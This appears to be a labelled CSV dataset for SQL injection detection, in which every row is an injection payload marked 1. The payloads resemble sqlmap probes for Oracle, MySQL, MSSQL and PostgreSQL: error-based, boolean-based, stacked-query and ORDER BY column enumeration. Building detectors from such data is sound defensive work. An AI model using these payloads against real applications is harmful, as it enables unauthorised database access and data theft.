Sentence,Label
1') AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('zehg' LIKE 'zehg,1
1%' AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'CHMH%'='CHMH,1
1' AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'ecfp' LIKE 'ecfp,1
"1"") AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (""imEg""=""imEg",1
"1"" AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ""NoEi""=""NoEi",1
1) AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (9573=9573,1
1)) AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ((9924=9924,1
1 AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)),1
1 AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113))-- uBQQ,1
1') AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('KFmY'='KFmY,1
1')) AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (('aMJq'='aMJq,1
1' AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'UXTD'='UXTD,1
1') AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('CLqK' LIKE 'CLqK,1
1%' AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'FaIW%'='FaIW,1
1' AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'pDmK' LIKE 'pDmK,1
"1"") AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (""yYhD""=""yYhD",1
"1"" AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ""GGOY""=""GGOY",1
"1) PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (4360=4360",1
"1)) PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ((1397=1397",1
"1 PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1)",1
"1 PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1)-- zhjc",1
"1') PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('oCZj'='oCZj",1
"1')) PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (('ZQUh'='ZQUh",1
"1' PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'rBwf'='rBwf",1
"1') PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('Bryl' LIKE 'Bryl",1
"1%' PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'hMsF%'='hMsF",1
"1' PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'fdhU' LIKE 'fdhU",1
"1"") PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (""sBTD""=""sBTD",1
"1"" PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ""BWHX""=""BWHX",1
"(EXTRACTVALUE(9902,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(9902=9902,1))),0x717a627671)))",1
(CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5412=5412) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)),1
1);DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1));DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1;DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1');DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1'));DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1';DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1%';DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
"1"");DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--",1
"1"";DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--",1
1) ORDER BY 1-- Mpgl,1
1) ORDER BY 5347-- xtrv,1
1)) ORDER BY 1-- dnsg,1
1)) ORDER BY 5868-- YHZq,1
1 ORDER BY 1-- WFxH,1
1 ORDER BY 1481-- sKgc,1
1 ORDER BY 1-- UlkC,1
1 ORDER BY 2629-- pthv,1
1') ORDER BY 1-- HLJP,1
1') ORDER BY 9820-- sTio,1
1')) ORDER BY 1-- ssMU,1
1')) ORDER BY 2906-- Inuq,1
1' ORDER BY 1-- DvZU,1
1' ORDER BY 6707-- zVFG,1
1') ORDER BY 1-- yOqq,1
1') ORDER BY 8055-- EJIf,1
1%' ORDER BY 1-- eQwk,1
1%' ORDER BY 6886-- hFeQ,1
1' ORDER BY 1-- VDQa,1
1' ORDER BY 7861-- kmBs,1
"1"") ORDER BY 1-- jjAo",1
"1"") ORDER BY 7087-- Fqjh",1
"1"" ORDER BY 1-- HwlI",1
"1"" ORDER BY 1814-- mLpe",1
1) ORDER BY 1#,1
1) ORDER BY 7712#,1
1)) ORDER BY 1#,1
1)) ORDER BY 1335#,1
1 ORDER BY 1#,1
1 ORDER BY 5822#,1
1 ORDER BY 1#,1
1 ORDER BY 5510#,1
1') ORDER BY 1#,1
1') ORDER BY 6154#,1
1')) ORDER BY 1#,1
1')) ORDER BY 9694#,1
1' ORDER BY 1#,1
1' ORDER BY 9215#,1
1') ORDER BY 1#,1
1') ORDER BY 5085#,1
1%' ORDER BY 1#,1
1%' ORDER BY 5098#,1
1' ORDER BY 1#,1
1' ORDER BY 6370#,1
"1"") ORDER BY 1#",1
"1"") ORDER BY 5809#",1
"1"" ORDER BY 1#",1
"1"" ORDER BY 1269#",1
"Submit..,(',((,""",1
"Submit'HVVxwq<'"">OnggPp",1
Submit') AND 4561=9003 AND ('zoSf'='zoSf,1
Submit') AND 8895=8895 AND ('viXG'='viXG,1
Submit') AND 5950=8820 AND ('TIrc'='TIrc,1
Submit')) AND 3893=9506 AND (('EMIW'='EMIW,1
Submit')) AND 8895=8895 AND (('aTNs'='aTNs,1
Submit')) AND 6413=1839 AND (('UvxM'='UvxM,1
Submit' AND 3349=7582 AND 'vEMs'='vEMs,1
Submit' AND 8895=8895 AND 'DAFQ'='DAFQ,1
Submit' AND 8408=7666 AND 'pzWf'='pzWf,1
Submit') AND 1902=8619 AND ('MUIG' LIKE 'MUIG,1
Submit') AND 8895=8895 AND ('lnJF' LIKE 'lnJF,1
Submit') AND 9643=5981 AND ('AmFo' LIKE 'AmFo,1
Submit%' AND 2959=2342 AND 'EvKm%'='EvKm,1
Submit%' AND 8895=8895 AND 'ZFCu%'='ZFCu,1
Submit%' AND 8555=5385 AND 'rfNg%'='rfNg,1
Submit' AND 2212=8476 AND 'CNJp' LIKE 'CNJp,1
Submit' AND 8895=8895 AND 'rhOh' LIKE 'rhOh,1
Submit' AND 3879=4697 AND 'tEqD' LIKE 'tEqD,1
"Submit"") AND 6049=1030 AND (""VtIZ""=""VtIZ",1
"Submit"") AND 8895=8895 AND (""rqqv""=""rqqv",1
"Submit"") AND 1651=7443 AND (""bGLI""=""bGLI",1
"Submit"" AND 9691=3295 AND ""EVNU""=""EVNU",1
"Submit"" AND 8895=8895 AND ""fGUD""=""fGUD",1
"Submit"" AND 9269=5560 AND ""lZAh""=""lZAh",1
Submit) AND 6958=2805 AND (3278=3278,1
Submit) AND 8895=8895 AND (4063=4063,1
Submit) AND 8870=9969 AND (2800=2800,1
Submit)) AND 3108=6855 AND ((5637=5637,1
Submit)) AND 8895=8895 AND ((8319=8319,1
Submit)) AND 5113=2866 AND ((7624=7624,1
Submit AND 4831=5603,1
Submit AND 8895=8895,1
Submit AND 6609=3251,1
Submit AND 3392=5562-- eqLo,1
Submit AND 8895=8895-- tVSS,1
Submit AND 6333=9305-- EEvz,1
Submit') AND 6015=(SELECT (CASE WHEN (6015=3665) THEN 6015 ELSE (SELECT 3665 UNION SELECT 7178) END))-- XTCj,1
Submit') AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- epAZ,1
Submit') AND 2348=(SELECT (CASE WHEN (2348=6198) THEN 2348 ELSE (SELECT 6198 UNION SELECT 8979) END))-- WzRW,1
Submit')) AND 5112=(SELECT (CASE WHEN (5112=5914) THEN 5112 ELSE (SELECT 5914 UNION SELECT 7255) END))-- kvEm,1
Submit')) AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- BEsu,1
Submit')) AND 4686=(SELECT (CASE WHEN (4686=6531) THEN 4686 ELSE (SELECT 6531 UNION SELECT 8693) END))-- IQgq,1
Submit' AND 6273=(SELECT (CASE WHEN (6273=9422) THEN 6273 ELSE (SELECT 9422 UNION SELECT 7661) END))-- Qohd,1
Submit' AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- mJbm,1
Submit' AND 8611=(SELECT (CASE WHEN (8611=7270) THEN 8611 ELSE (SELECT 7270 UNION SELECT 3899) END))-- sTRS,1
Submit%' AND 8880=(SELECT (CASE WHEN (8880=6730) THEN 8880 ELSE (SELECT 6730 UNION SELECT 4773) END))-- ogXV,1
Submit%' AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- kxyf,1
Submit%' AND 3213=(SELECT (CASE WHEN (3213=5616) THEN 3213 ELSE (SELECT 5616 UNION SELECT 3095) END))-- ANYX,1
"Submit"") AND 8204=(SELECT (CASE WHEN (8204=2215) THEN 8204 ELSE (SELECT 2215 UNION SELECT 8481) END))-- ZVGh",1
"Submit"") AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- DeRl",1
"Submit"") AND 1878=(SELECT (CASE WHEN (1878=6371) THEN 1878 ELSE (SELECT 6371 UNION SELECT 7335) END))-- XEWS",1
"Submit"" AND 5218=(SELECT (CASE WHEN (5218=2348) THEN 5218 ELSE (SELECT 2348 UNION SELECT 6279) END))-- bxCa",1
"Submit"" AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- onso",1
"Submit"" AND 2811=(SELECT (CASE WHEN (2811=4934) THEN 2811 ELSE (SELECT 4934 UNION SELECT 9233) END))-- EftY",1
Submit) AND 9872=(SELECT (CASE WHEN (9872=2701) THEN 9872 ELSE (SELECT 2701 UNION SELECT 4588) END))-- VVGF,1
Submit) AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- ECWF,1
Submit) AND 5816=(SELECT (CASE WHEN (5816=3194) THEN 5816 ELSE (SELECT 3194 UNION SELECT 1190) END))-- mHNL,1
Submit)) AND 1808=(SELECT (CASE WHEN (1808=3760) THEN 1808 ELSE (SELECT 3760 UNION SELECT 3309) END))-- wMxG,1
Submit)) AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- hDIl,1
Submit)) AND 9116=(SELECT (CASE WHEN (9116=3172) THEN 9116 ELSE (SELECT 3172 UNION SELECT 6123) END))-- LVin,1
Submit AND 1485=(SELECT (CASE WHEN (1485=7689) THEN 1485 ELSE (SELECT 7689 UNION SELECT 2945) END))-- ZuSH,1
Submit AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- BthC,1
Submit AND 8051=(SELECT (CASE WHEN (8051=6573) THEN 8051 ELSE (SELECT 6573 UNION SELECT 3905) END))-- fgvn,1
Submit') AND 3082=6295-- jQRg,1
Submit') AND 1493=1493-- Pjur,1
Submit') AND 3299=4753-- DpbE,1
Submit')) AND 3818=5362-- JLKB,1
Submit')) AND 1493=1493-- CpKk,1
Submit')) AND 8312=1735-- MgdD,1
Submit' AND 9499=8495-- iexl,1
Submit' AND 1493=1493-- wAfk,1
Submit' AND 9912=5770-- rqkw,1
Submit%' AND 4150=2262-- nXRV,1
Submit%' AND 1493=1493-- ctSS,1
Submit%' AND 7427=9868-- rJjl,1
"Submit"") AND 9080=1553-- tDyI",1
"Submit"") AND 1493=1493-- pXcq",1
"Submit"") AND 2014=2088-- hPJL",1
"Submit"" AND 6956=1919-- bZZq",1
"Submit"" AND 1493=1493-- hpHd",1
"Submit"" AND 3542=8206-- RlwW",1
Submit) AND 7617=3158-- DSqW,1
Submit) AND 1493=1493-- uTUQ,1
Submit) AND 1807=8590-- dniP,1
Submit)) AND 1871=9759-- RuWu,1
Submit)) AND 1493=1493-- Hjqs,1
Submit)) AND 1987=8213-- xkQL,1
Submit') RLIKE (SELECT (CASE WHEN (7621=9476) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('fZXO'='fZXO,1
Submit') RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('egAk'='egAk,1
Submit') RLIKE (SELECT (CASE WHEN (6622=6223) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('uPIl'='uPIl,1
Submit')) RLIKE (SELECT (CASE WHEN (8811=2026) THEN 0x5375626d6974 ELSE 0x28 END)) AND (('sHdZ'='sHdZ,1
Submit')) RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND (('IKTS'='IKTS,1
Submit')) RLIKE (SELECT (CASE WHEN (2905=6268) THEN 0x5375626d6974 ELSE 0x28 END)) AND (('ddot'='ddot,1
Submit' RLIKE (SELECT (CASE WHEN (1676=4273) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'INQD'='INQD,1
Submit' RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'pKIC'='pKIC,1
Submit' RLIKE (SELECT (CASE WHEN (3093=8730) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'nTpa'='nTpa,1
Submit') RLIKE (SELECT (CASE WHEN (1693=8278) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('BDrL' LIKE 'BDrL,1
Submit') RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('zHAQ' LIKE 'zHAQ,1
Submit') RLIKE (SELECT (CASE WHEN (4885=1694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('kzRw' LIKE 'kzRw,1
Submit%' RLIKE (SELECT (CASE WHEN (2262=5283) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'OEUf%'='OEUf,1
Submit%' RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'OarL%'='OarL,1
Submit%' RLIKE (SELECT (CASE WHEN (9802=9693) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'rWjF%'='rWjF,1
Submit' RLIKE (SELECT (CASE WHEN (5895=1050) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'vrGJ' LIKE 'vrGJ,1
Submit' RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'Zkpi' LIKE 'Zkpi,1
Submit' RLIKE (SELECT (CASE WHEN (4021=2876) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'Phkj' LIKE 'Phkj,1
"Submit"") RLIKE (SELECT (CASE WHEN (7349=9929) THEN 0x5375626d6974 ELSE 0x28 END)) AND (""wkUH""=""wkUH",1
"Submit"") RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND (""Vboy""=""Vboy",1
"Submit"") RLIKE (SELECT (CASE WHEN (2917=8592) THEN 0x5375626d6974 ELSE 0x28 END)) AND (""zIwJ""=""zIwJ",1
"Submit"" RLIKE (SELECT (CASE WHEN (3683=3887) THEN 0x5375626d6974 ELSE 0x28 END)) AND ""RNcS""=""RNcS",1
"Submit"" RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ""gkaL""=""gkaL",1
"Submit"" RLIKE (SELECT (CASE WHEN (5288=6525) THEN 0x5375626d6974 ELSE 0x28 END)) AND ""XICV""=""XICV",1
Submit) RLIKE (SELECT (CASE WHEN (7783=6188) THEN 0x5375626d6974 ELSE 0x28 END)) AND (2665=2665,1
Submit) RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND (2219=2219,1
Submit) RLIKE (SELECT (CASE WHEN (2063=9769) THEN 0x5375626d6974 ELSE 0x28 END)) AND (2711=2711,1
Submit)) RLIKE (SELECT (CASE WHEN (2145=3537) THEN 0x5375626d6974 ELSE 0x28 END)) AND ((1123=1123,1
Submit)) RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ((1064=1064,1
Submit)) RLIKE (SELECT (CASE WHEN (7081=5218) THEN 0x5375626d6974 ELSE 0x28 END)) AND ((1183=1183,1
Submit RLIKE (SELECT (CASE WHEN (5058=3534) THEN 0x5375626d6974 ELSE 0x28 END)),1
Submit RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)),1
Submit RLIKE (SELECT (CASE WHEN (3387=2899) THEN 0x5375626d6974 ELSE 0x28 END)),1
Submit RLIKE (SELECT (CASE WHEN (1526=3415) THEN 0x5375626d6974 ELSE 0x28 END))-- bhgz,1
Submit RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END))-- CbNK,1
Submit RLIKE (SELECT (CASE WHEN (7815=9928) THEN 0x5375626d6974 ELSE 0x28 END))-- uRNn,1
Submit') AND (SELECT (CASE WHEN (1967=7958) THEN NULL ELSE CAST((CHR(85)||CHR(103)||CHR(85)||CHR(87)) AS NUMERIC) END)) IS NULL AND ('aQPJ'='aQPJ,1
Submit') AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ('QkbJ'='QkbJ,1
Submit') AND (SELECT (CASE WHEN (9063=7665) THEN NULL ELSE CAST((CHR(115)||CHR(98)||CHR(122)||CHR(114)) AS NUMERIC) END)) IS NULL AND ('uRzA'='uRzA,1
Submit')) AND (SELECT (CASE WHEN (6543=2098) THEN NULL ELSE CAST((CHR(87)||CHR(90)||CHR(75)||CHR(66)) AS NUMERIC) END)) IS NULL AND (('puRU'='puRU,1
Submit')) AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND (('UqjQ'='UqjQ,1
Submit')) AND (SELECT (CASE WHEN (4056=5147) THEN NULL ELSE CAST((CHR(76)||CHR(75)||CHR(121)||CHR(81)) AS NUMERIC) END)) IS NULL AND (('qFrW'='qFrW,1
Submit' AND (SELECT (CASE WHEN (6594=1557) THEN NULL ELSE CAST((CHR(85)||CHR(79)||CHR(76)||CHR(103)) AS NUMERIC) END)) IS NULL AND 'bmfh'='bmfh,1
Submit' AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND 'qrWV'='qrWV,1
